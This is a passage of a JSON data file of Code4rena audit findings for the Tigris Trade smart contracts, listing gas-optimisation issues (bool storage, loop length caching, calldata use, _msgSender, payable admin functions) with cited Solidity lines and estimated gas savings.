      "content": "```solidity\n    // Booleans are more expensive than uint256 or any type that takes up a full\n    // word because each write operation emits an extra SLOAD to first read the\n    // slot's contents, replace the bits taken up by the boolean, and then write\n    // back. This is the compiler's defense against contract upgrades and\n    // pointer aliasing, and it cannot be disabled.\n```\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27\nUse `uint256(1)` and `uint256(2)` for true/false to avoid a Gwarmaccess (**[100 gas](https://gist.github.com/IllIllI000/1b70014db712f8572a72378321250058)**) for the extra SLOAD, and to avoid Gsset (**20000 gas**) when changing from `false` to `true`, after having been `true` in the past\n\n*There are 16 instances of this issue:*\n\n```solidity\nFile: contracts/BondNFT.sol\n\n/// @audit (valid but excluded finding)\n32:       mapping(address => bool) public allowedAsset;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L32\n\n```solidity\nFile: contracts/GovNFT.sol\n\n/// @audit (valid but excluded finding)\n22:       mapping(uint16 => mapping(address => bool)) public isTrustedAddress;\n\n/// @audit (valid but excluded finding)\n265:      mapping(address => bool) private _allowedAsset;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L22\n\n```solidity\nFile: contracts/Lock.sol\n\n/// @audit (valid but excluded finding)\n18:       mapping(address => bool) public allowedAssets;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L18\n\n```solidity\nFile: contracts/PairsContract.sol\n\n/// @audit (valid but excluded finding)\n12:       mapping(uint256 => bool) public allowedAsset;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/PairsContract.sol#L12\n\n```solidity\nFile: contracts/Position.sol\n\n/// @audit (valid but excluded finding)\n20:       mapping(address => bool) private _isMinter; // Trading contract should be minter\n\n/// @audit (valid but excluded finding)\n34:       mapping(uint256 => mapping(address => mapping(bool => int256))) private accInterestPerOi;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Position.sol#L20\n\n```solidity\nFile: contracts/Referrals.sol\n\n/// @audit (valid but excluded finding)\n9:        bool private isInit;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Referrals.sol#L9\n\n```solidity\nFile: contracts/StableToken.sol\n\n/// @audit (valid but excluded finding)\n9:        mapping(address => bool) public isMinter;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/StableToken.sol#L9\n\n```solidity\nFile: contracts/StableVault.sol\n\n/// @audit (valid but excluded finding)\n29:       mapping(address => bool) public allowed;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/StableVault.sol#L29\n\n```solidity\nFile: contracts/TradingExtension.sol\n\n/// @audit (valid but excluded finding)\n15:       bool public chainlinkEnabled;\n\n/// @audit (valid but excluded finding)\n17:       mapping(address => bool) private isNode;\n\n/// @audit (valid but excluded finding)\n19:       mapping(address => bool) public allowedMargin;\n\n/// @audit (valid but excluded finding)\n20:       bool public paused;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/TradingExtension.sol#L15\n\n```solidity\nFile: contracts/Trading.sol\n\n/// @audit (valid but excluded finding)\n134:      mapping(address => bool) public allowedVault;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Trading.sol#L134\n\n```solidity\nFile: contracts/utils/MetaContext.sol\n\n/// @audit (valid but excluded finding)\n7:        mapping(address => bool) private _isTrustedForwarder;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/utils/MetaContext.sol#L7\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43218",
      "title": "[G-25]  `<array>.length` should not be looked up in every loop of a `for`-loop",
      "impact": "GAS",
      "content": "The overheads outlined below are _PER LOOP_, excluding the first loop\n* storage arrays incur a Gwarmaccess (**100 gas**)\n* memory arrays use `MLOAD` (**3 gas**)\n* calldata arrays use `CALLDATALOAD` (**3 gas**)\n\nCaching the length changes each of these to a `DUP<N>` (**3 gas**), and gets rid of the extra `DUP<N>` needed to store the stack offset\n\n*There are 13 instances of this issue:*\n\n```solidity\nFile: contracts/BondNFT.sol\n\n/// @audit (valid but excluded finding)\n284:              for (uint i=0; i<_ids.length; i++) {\n\n/// @audit (valid but excluded finding)\n292:              for (uint i=0; i<_ids.length; i++) {\n\n/// @audit (valid but excluded finding)\n300:              for (uint i=0; i<_ids.length; i++) {\n\n/// @audit (valid but excluded finding)\n342:              for (uint i=0; i<_ids.length; i++) {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L284\n\n```solidity\nFile: contracts/GovNFT.sol\n\n/// @audit (valid but excluded finding)\n131:          for (uint i=0; i<tokenId.length; i++) {\n\n/// @audit (valid but excluded finding)\n200:          for (uint i=0; i<tokenId.length; i++) {\n\n/// @audit (valid but excluded finding)\n246:          for (uint i=0; i<_ids.length; i++) {\n\n/// @audit (valid but excluded finding)\n252:          for (uint i=0; i<_ids.length; i++) {\n\n/// @audit (valid but excluded finding)\n258:          for (uint i=0; i<_ids.length; i++) {\n\n/// @audit (valid but excluded finding)\n325:          for (uint i=0; i<_ids.length; i++) {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L131\n\n```solidity\nFile: contracts/Lock.sol\n\n/// @audit (valid but excluded finding)\n113:          for (uint i=0; i < assets.length; i++) {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L113\n\n```solidity\nFile: contracts/Position.sol\n\n/// @audit (valid but excluded finding)\n296:          for (uint i=0; i<_ids.length; i++) {\n\n/// @audit (valid but excluded finding)\n304:          for (uint i=0; i<_ids.length; i++) {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Position.sol#L296\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43217",
      "title": "[G-24]  State variables should be cached in stack variables rather than re-reading them from storage",
      "impact": "GAS",
      "content": "The instances below point to the second+ access of a state variable within a function. Caching of a state variable replaces each Gwarmaccess (**100 gas**) with a much cheaper stack read. Other less obvious fixes/optimizations include having local memory caches of state variable structs, or having local caches of state variable contracts/addresses.\n\n*There are 20 instances of this issue:*\n\n```solidity\nFile: contracts/GovNFT.sol\n\n/// @audit assets on line 54 - (valid but excluded finding)\n54:               userPaid[to][assets[i]] += accRewardsPerNFT[assets[i]];\n\n/// @audit assets on line 68 - (valid but excluded finding)\n68:               userPaid[to][assets[i]] += accRewardsPerNFT[assets[i]];\n\n/// @audit assets on line 79 - (valid but excluded finding)\n79:               userDebt[owner][assets[i]] += accRewardsPerNFT[assets[i]];\n\n/// @audit assets on line 79 - (valid but excluded finding)\n/// @audit assets on line 80 - (valid but excluded finding)\n80:               userDebt[owner][assets[i]] -= userPaid[owner][assets[i]]/balanceOf(owner);\n\n/// @audit assets on line 80 - (valid but excluded finding)\n/// @audit assets on line 81 - (valid but excluded finding)\n81:               userPaid[owner][assets[i]] -= userPaid[owner][assets[i]]/balanceOf(owner);            \n\n/// @audit assets on line 96 - (valid but excluded finding)\n96:               userDebt[from][assets[i]] += accRewardsPerNFT[assets[i]];\n\n/// @audit assets on line 96 - (valid but excluded finding)\n/// @audit assets on line 97 - (valid but excluded finding)\n97:               userDebt[from][assets[i]] -= userPaid[from][assets[i]]/balanceOf(from);\n\n/// @audit assets on line 97 - (valid but excluded finding)\n/// @audit assets on line 98 - (valid but excluded finding)\n98:               userPaid[from][assets[i]] -= userPaid[from][assets[i]]/balanceOf(from);\n\n/// @audit assets on line 98 - (valid but excluded finding)\n/// @audit assets on line 99 - (valid but excluded finding)\n99:               userPaid[to][assets[i]] += accRewardsPerNFT[assets[i]];\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L54\n\n```solidity\nFile: contracts/PairsContract.sol\n\n/// @audit _idToAsset[_asset].minLeverage on line 81 - (valid but excluded finding)\n84:           require(_idToAsset[_asset].maxLeverage >= _idToAsset[_asset].minLeverage, \"Wrong leverage values\");\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/PairsContract.sol#L84\n\n```solidity\nFile: contracts/Position.sol\n\n/// @audit _trades[_id].margin on line 232 - (valid but excluded finding)\n233:          initId[_id] = accInterestPerOi[_trades[_id].asset][_trades[_id].tigAsset][_trades[_id].direction]*int256(_trades[_id].margin*_trades[_id].leverage/1e18)/1e18;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Position.sol#L233\n\n```solidity\nFile: contracts/Trading.sol\n\n/// @audit limitOrderPriceRange on line 496 - (valid but excluded finding)\n496:              if (_price > trade.price+trade.price*limitOrderPriceRange/DIVISION_CONSTANT || _price < trade.price-trade.price*limitOrderPriceRange/DIVISION_CONSTANT) revert(\"6\"); //LimitNotMet\n\n/// @audit maxWinPercent on line 625 - (valid but excluded finding)\n625:                  if (maxWinPercent > 0 && _toMint > _trade.margin*maxWinPercent/DIVISION_CONSTANT) {\n\n/// @audit maxWinPercent on line 625 - (valid but excluded finding)\n626:                      _toMint = _trade.margin*maxWinPercent/DIVISION_CONSTANT;\n\n/// @audit blockDelay on line 861 - (valid but excluded finding)\n864:                  blockDelayPassed[_id].delay = block.number + blockDelay;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Trading.sol#L496\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43216",
      "title": "[G-23]  Using `calldata` instead of `memory` for read-only arguments in `external` functions saves gas",
      "impact": "GAS",
      "content": "When a function with a `memory` array is called externally, the `abi.decode()` step has to use a for-loop to copy each index of the `calldata` to the `memory` index. **Each iteration of this for-loop costs at least 60 gas** (i.e. `60 * <mem_array>.length`). Using `calldata` directly, obliviates the need for such a loop in the contract code and runtime execution. Note that even if an interface defines a function as having `memory` arguments, it's still valid for implementation contracs to use `calldata` arguments instead. \n\nIf the array is passed to an `internal` function which passes the array to another internal function where the array is modified and therefore `memory` is used in the `external` call, it's still more gass-efficient to use `calldata` when the `external` function uses modifiers, since the modifiers may prevent the internal functions from being called. Structs have the same overhead as an array of length one\n\nNote that I've also flagged instances where the function is `public` but can be marked as `external` since it's not called by the contract, and cases where a constructor is involved\n\n*There are 12 instances of this issue:*\n\n```solidity\nFile: contracts/GovNFT.sol\n\n/// @audit _destination - (valid but excluded finding)\n/// @audit tokenId - (valid but excluded finding)\n124       function crossChain(\n125           uint16 _dstChainId,\n126           bytes memory _destination,\n127           address _to,\n128:          uint256[] memory tokenId\n\n/// @audit _srcAddress - (valid but excluded finding)\n/// @audit _payload - (valid but excluded finding)\n168       function lzReceive(\n169           uint16 _srcChainId,\n170           bytes memory _srcAddress,\n171           uint64 _nonce,\n172:          bytes memory _payload\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L124-L128\n\n```solidity\nFile: contracts/Lock.sol\n\n/// @audit _ids - (valid but excluded finding)\n138       function sendNFTs(\n139           uint[] memory _ids\n140:      ) external onlyOwner() {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L138-L140\n\n```solidity\nFile: contracts/PairsContract.sol\n\n/// @audit _name - (valid but excluded finding)\n48:       function addAsset(uint256 _asset, string memory _name, address _chainlinkFeed, uint256 _minLeverage, uint256 _maxLeverage, uint256 _feeMultiplier, uint256 _baseFundingRate) external onlyOwner {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/PairsContract.sol#L48\n\n```solidity\nFile: contracts/Position.sol\n\n/// @audit _newBaseURI - (valid but excluded finding)\n85:       function setBaseURI(string memory _newBaseURI) external onlyOwner {\n\n/// @audit _mintTrade - (valid but excluded finding)\n131       function mint(\n132           MintTrade memory _mintTrade\n133:      ) external onlyMinter {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Position.sol#L85\n\n```solidity\nFile: contracts/Referrals.sol\n\n/// @audit _codeOwners - (valid but excluded finding)\n/// @audit _ownedCodes - (valid but excluded finding)\n/// @audit _referredA - (valid but excluded finding)\n/// @audit _referredTo - (valid but excluded finding)\n60        function initRefs(\n61            address[] memory _codeOwners,\n62            bytes32[] memory _ownedCodes,\n63            address[] memory _referredA,\n64            bytes32[] memory _referredTo\n65:       ) external onlyOwner {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Referrals.sol#L60-L65\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43215",
      "title": "[G-22]  Don't use `_msgSender()` if not supporting EIP-2771",
      "impact": "GAS",
      "content": "Use `msg.sender` if the code does not implement [EIP-2771 trusted forwarder](https://eips.ethereum.org/EIPS/eip-2771) support\n\n*There are 30 instances of this issue:*\n\n```solidity\nFile: contracts/BondNFT.sol\n\n216:          IERC20(_tigAsset).transferFrom(_msgSender(), address(this), _amount);\n\n285:                  _transfer(_msgSender(), _to, _ids[i]);\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L216\n\n```solidity\nFile: contracts/GovNFT.sol\n\n65:           require(msg.sender == address(this) || _msgSender() == owner(), \"NotBridge\");\n\n106:              _mint(_msgSender(), counter);\n\n111:          _mint(_msgSender(), counter);\n\n132:              require(_msgSender() == ownerOf(tokenId[i]), \"Not the owner\");\n\n161:              payable(_msgSender()),\n\n174:          require(_msgSender() == address(endpoint), \"!Endpoint\");\n\n247:              _transfer(_msgSender(), _to, _ids[i]);\n\n276:          address _msgsender = _msgSender();\n\n289:          try IERC20(_tigAsset).transferFrom(_msgSender(), address(this), _amount) {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L65\n\n```solidity\nFile: contracts/PairsContract.sol\n\n190:          require(_msgSender() == address(protocol), \"!Protocol\");\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/PairsContract.sol#L190\n\n```solidity\nFile: contracts/Position.sol\n\n315:          require(_isMinter[_msgSender()], \"!Minter\");\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Position.sol#L315\n\n```solidity\nFile: contracts/Referrals.sol\n\n22:           _referral[_hash] = _msgSender();\n\n23:           emit ReferralCreated(_msgSender(), _hash);\n\n81:           require(_msgSender() == address(protocol), \"!Protocol\");\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Referrals.sol#L22\n\n```solidity\nFile: contracts/StableToken.sol\n\n52:           require(isMinter[_msgSender()], \"!Minter\");\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/StableToken.sol#L52\n\n```solidity\nFile: contracts/StableVault.sol\n\n46:           IERC20(_token).transferFrom(_msgSender(), address(this), _amount);\n\n48:               _msgSender(),\n\n56:           ERC20Permit(_token).permit(_msgSender(), address(this), _toAllow, _deadline, v, r, s);\n\n66:           IERC20Mintable(stable).burnFrom(_msgSender(), _amount);\n\n69:               _msgSender(),\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/StableVault.sol#L46\n\n```solidity\nFile: contracts/Trading.sol\n\n520:              emit LimitOrderExecuted(trade.asset, trade.direction, trade.price, trade.leverage, trade.margin - _fee, _id, trade.trader, _msgSender());\n\n554:              emit PositionLiquidated(_id, _trade.trader, _msgSender());\n\n584:          proxyApprovals[_msgSender()] = Proxy(\n\n631:          emit PositionClosed(_id, _price, _percent, _toMint, _trade.trader, _isBot ? _msgSender() : _trade.trader);\n\n722:                      _msgSender(),\n\n798:                      _msgSender(),\n\n885:          if (_trader != _msgSender()) {\n\n887:              require(_proxy.proxy == _msgSender() && _proxy.time >= block.timestamp, \"Proxy not approved\");\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Trading.sol#L520\n\n\n___\n\n## Excluded Gas Optimization Findings\nThese findings are excluded from awards calculations because there are publicly-available automated tools that find them. The valid ones appear here for completeness\n\n| |Issue|Instances|Total Gas Saved|\n|-|:-|:-:|:-:|\n| [G&#x2011;23] | Using `calldata` instead of `memory` for read-only arguments in `external` functions saves gas | 12 |  1440 |\n| [G&#x2011;24] | State variables should be cached in stack variables rather than re-reading them from storage | 20 |  1940 |\n| [G&#x2011;25] | `<array>.length` should not be looked up in every loop of a `for`-loop | 13 |  39 |\n| [G&#x2011;26] | Using `bool`s for storage incurs overhead | 16 |  273600 |\n| [G&#x2011;27] | Using `> 0` costs more gas than `!= 0` when used on a `uint` in a `require()` statement | 1 |  6 |\n| [G&#x2011;28] | `++i` costs less gas than `i++`, especially when it's used in `for`-loops (`--i`/`i--` too) | 21 |  105 |\n| [G&#x2011;29] | Using `private` rather than `public` for constants, saves gas | 3 |  - |\n| [G&#x2011;30] | Use custom errors rather than `revert()`/`require()` strings to save gas | 64 |  - |\n\nTotal: 150 instances over 8 issues with **277130 gas** saved\n\nGas totals use lower bounds of ranges and count two iterations of each `for`-loop. All values above are runtime, not deployment, values; deployment values are listed in the individual issue descriptions. The table above as well as its gas numbers do not include any of the excluded findings.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43214",
      "title": "[G-21]  Functions guaranteed to revert when called by normal users can be marked `payable`",
      "impact": "GAS",
      "content": "If a function modifier such as `onlyOwner` is used, the function will revert if a normal user tries to pay the function. Marking the function as `payable` will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. The extra opcodes avoided are \n`CALLVALUE`(2),`DUP1`(3),`ISZERO`(3),`PUSH2`(3),`JUMPI`(10),`PUSH1`(3),`DUP1`(3),`REVERT`(0),`JUMPDEST`(1),`POP`(2), which costs an average of about **21 gas per call** to the function, in addition to the extra deployment cost\n\n*There are 69 instances of this issue:*\n\n```solidity\nFile: contracts/BondNFT.sol\n\n57        function createLock(\n58            address _asset,\n59            uint _amount,\n60            uint _period,\n61            address _owner\n62:       ) external onlyManager() returns(uint id) {\n\n97        function extendLock(\n98            uint _id,\n99            address _asset,\n100           uint _amount,\n101           uint _period,\n102           address _sender\n103:      ) external onlyManager() {\n\n137       function release(\n138           uint _id,\n139           address _releaser\n140:      ) external onlyManager() returns(uint amount, uint lockAmount, address asset, address _owner) {\n\n168       function claim(\n169           uint _id,\n170           address _claimer\n171:      ) public onlyManager() returns(uint amount, address tigAsset) {\n\n196       function claimDebt(\n197           address _user,\n198           address _tigAsset\n199:      ) public onlyManager() returns(uint amount) {\n\n349:      function addAsset(address _asset) external onlyOwner {\n\n357:      function setAllowedAsset(address _asset, bool _bool) external onlyOwner {\n\n362:      function setBaseURI(string calldata _newBaseURI) external onlyOwner {\n\n366       function setManager(\n367           address _manager\n368:      ) public onlyOwner() {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L57-L62\n\n```solidity\nFile: contracts/GovNFT.sol\n\n46:       function setBaseURI(string calldata _newBaseURI) external onlyOwner {\n\n104:      function mintMany(uint _amount) external onlyOwner {\n\n110:      function mint() external onlyOwner {\n\n114:      function setTrustedAddress(uint16 _chainId, address _contract, bool _bool) external onlyOwner {\n\n236:      function setGas(uint _gas) external onlyOwner {\n\n240:      function setEndpoint(ILayerZeroEndpoint _endpoint) external onlyOwner {\n\n300:      function addAsset(address _asset) external onlyOwner {\n\n307:      function setAllowedAsset(address _asset, bool _bool) external onlyOwner {\n\n311:      function setMaxBridge(uint256 _max) external onlyOwner {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L46\n\n```solidity\nFile: contracts/Lock.sol\n\n127       function editAsset(\n128           address _tigAsset,\n129           bool _isAllowed\n130:      ) external onlyOwner() {\n\n138       function sendNFTs(\n139           uint[] memory _ids\n140:      ) external onlyOwner() {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L127-L130\n\n```solidity\nFile: contracts/PairsContract.sol\n\n33:       function setAssetChainlinkFeed(uint256 _asset, address _feed) external onlyOwner {\n\n48:       function addAsset(uint256 _asset, string memory _name, address _chainlinkFeed, uint256 _minLeverage, uint256 _maxLeverage, uint256 _feeMultiplier, uint256 _baseFundingRate) external onlyOwner {\n\n73:       function updateAssetLeverage(uint256 _asset, uint256 _minLeverage, uint256 _maxLeverage) external onlyOwner {\n\n92:       function setAssetBaseFundingRate(uint256 _asset, uint256 _baseFundingRate) external onlyOwner {\n\n104:      function updateAssetFeeMultiplier(uint256 _asset, uint256 _feeMultiplier) external onlyOwner {\n\n115:      function pauseAsset(uint256 _asset, bool _isPaused) external onlyOwner {\n\n125:      function setMaxBaseFundingRate(uint256 _maxBaseFundingRate) external onlyOwner {\n\n129:      function setProtocol(address _protocol) external onlyOwner {\n\n139:      function setMaxOi(uint256 _asset, address _tigAsset, uint256 _maxOi) external onlyOwner {\n\n154:      function modifyLongOi(uint256 _asset, address _tigAsset, bool _onOpen, uint256 _amount) external onlyProtocol {\n\n174:      function modifyShortOi(uint256 _asset, address _tigAsset, bool _onOpen, uint256 _amount) external onlyProtocol {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/PairsContract.sol#L33\n\n```solidity\nFile: contracts/Position.sol\n\n85:       function setBaseURI(string memory _newBaseURI) external onlyOwner {\n\n99:       function updateFunding(uint256 _asset, address _tigAsset, uint256 _longOi, uint256 _shortOi, uint256 _baseFundingRate, uint _vaultFundingPercent) external onlyMinter {\n\n131       function mint(\n132           MintTrade memory _mintTrade\n133:      ) external onlyMinter {\n\n168:      function executeLimitOrder(uint256 _id, uint256 _price, uint256 _newMargin) external onlyMinter {\n\n197:      function modifyMargin(uint256 _id, uint256 _newMargin, uint256 _newLeverage) external onlyMinter {\n\n209:      function addToPosition(uint256 _id, uint256 _newMargin, uint256 _newPrice) external onlyMinter {\n\n220:      function setAccInterest(uint256 _id) external onlyMinter {\n\n230:      function reducePosition(uint256 _id, uint256 _percent) external onlyMinter {\n\n242:      function modifyTp(uint _id, uint _tpPrice) external onlyMinter {\n\n252:      function modifySl(uint _id, uint _slPrice) external onlyMinter {\n\n260:      function burn(uint _id) external onlyMinter {\n\n310:      function setMinter(address _minter, bool _bool) external onlyOwner {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Position.sol#L85\n\n```solidity\nFile: contracts/Referrals.sol\n\n32:       function setReferred(address _referredTrader, bytes32 _hash) external onlyProtocol {\n\n53:       function setProtocol(address _protocol) external onlyOwner {\n\n60        function initRefs(\n61            address[] memory _codeOwners,\n62            bytes32[] memory _ownedCodes,\n63            address[] memory _referredA,\n64            bytes32[] memory _referredTo\n65:       ) external onlyOwner {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Referrals.sol#L32\n\n```solidity\nFile: contracts/StableToken.sol\n\n13        function burnFrom(\n14            address account,\n15            uint256 amount\n16        ) \n17            public \n18            virtual \n19:           onlyMinter() \n\n24        function mintFor(\n25            address account,\n26            uint256 amount\n27        ) \n28            public \n29            virtual \n30:           onlyMinter() \n\n38        function setMinter(\n39            address _address,\n40            bool _status\n41        ) \n42            public\n43:           onlyOwner()\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/StableToken.sol#L13-L19\n\n```solidity\nFile: contracts/StableVault.sol\n\n78:       function listToken(address _token) external onlyOwner {\n\n89:       function delistToken(address _token) external onlyOwner {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/StableVault.sol#L78\n\n```solidity\nFile: contracts/TradingExtension.sol\n\n61        function _closePosition(\n62            uint _id,\n63            uint _price,\n64            uint _percent\n65:       ) external onlyProtocol returns (IPosition.Trade memory _trade, uint256 _positionSize, int256 _payout) {\n\n126       function modifyShortOi(\n127           uint _asset,\n128           address _tigAsset,\n129           bool _onOpen,\n130           uint _size\n131:      ) public onlyProtocol {\n\n135       function modifyLongOi(\n136           uint _asset,\n137           address _tigAsset,\n138           bool _onOpen,\n139           uint _size\n140:      ) public onlyProtocol {\n\n144:      function setMaxGasPrice(uint _maxGasPrice) external onlyOwner {\n\n190       function _setReferral(\n191           bytes32 _referral,\n192           address _trader\n193:      ) external onlyProtocol {\n\n222       function setValidSignatureTimer(\n223           uint _validSignatureTimer\n224       )\n225           external\n226:          onlyOwner\n\n231:      function setChainlinkEnabled(bool _bool) external onlyOwner {\n\n240:      function setNode(address _node, bool _bool) external onlyOwner {\n\n249       function setAllowedMargin(\n250           address _tigAsset,\n251           bool _bool\n252       ) \n253           external\n254:          onlyOwner\n\n264       function setMinPositionSize(\n265           address _tigAsset,\n266           uint _min\n267       ) \n268           external\n269:          onlyOwner\n\n274:      function setPaused(bool _paused) external onlyOwner {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/TradingExtension.sol#L61-L65\n\n```solidity\nFile: contracts/Trading.sol\n\n898       function setBlockDelay(\n899           uint _blockDelay\n900       )\n901           external\n902:          onlyOwner\n\n912       function setAllowedVault(\n913           address _stableVault,\n914           bool _bool\n915       )\n916           external\n917:          onlyOwner\n\n926       function setMaxWinPercent(\n927           uint _maxWinPercent\n928       )\n929           external\n930:          onlyOwner\n\n939:      function setLimitOrderPriceRange(uint _range) external onlyOwner {\n\n952:      function setFees(bool _open, uint _daoFees, uint _burnFees, uint _referralFees, uint _botFees, uint _percent) external onlyOwner {\n\n975       function setTradingExtension(\n976           address _ext\n977:      ) external onlyOwner() {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Trading.sol#L898-L902\n\n```solidity\nFile: contracts/utils/MetaContext.sol\n\n9:        function setTrustedForwarder(address _forwarder, bool _bool) external onlyOwner {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/utils/MetaContext.sol#L9\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43213",
      "title": "[G-20]  Use custom errors rather than `revert()`/`require()` strings to save gas",
      "impact": "GAS",
